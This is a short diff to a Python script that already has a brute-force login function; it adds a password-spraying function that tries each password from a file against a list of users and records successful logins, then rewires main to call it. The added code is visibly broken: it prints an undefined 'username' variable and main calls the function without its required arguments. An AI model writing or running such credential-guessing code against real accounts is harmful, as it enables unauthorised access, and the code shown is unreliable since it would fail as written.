@@ -30,12 +30,21 @@ def bruteforce(filename, username):
                 return True
     return False
 
+def password_spraying(filename,users):
+    successful_cracks = {}
+    with open(filename, "r") as file:
+        passwords = file.readlines()
+        for line in passwords:
+            line = line.rstrip("\n")
+            print(f"trying: {username},{line}")
+            for user in users:
+                if try_login(user, line):
+                    successful_cracks[user] = line
+    return successful_cracks
+
 
 def main():
-    if bruteforce("passwords.txt", "user"):
-        print("Password cracked")
-    else:
-        print("Unsuccessful")
+    password_spraying()
 
 
 if __name__ == "__main__":
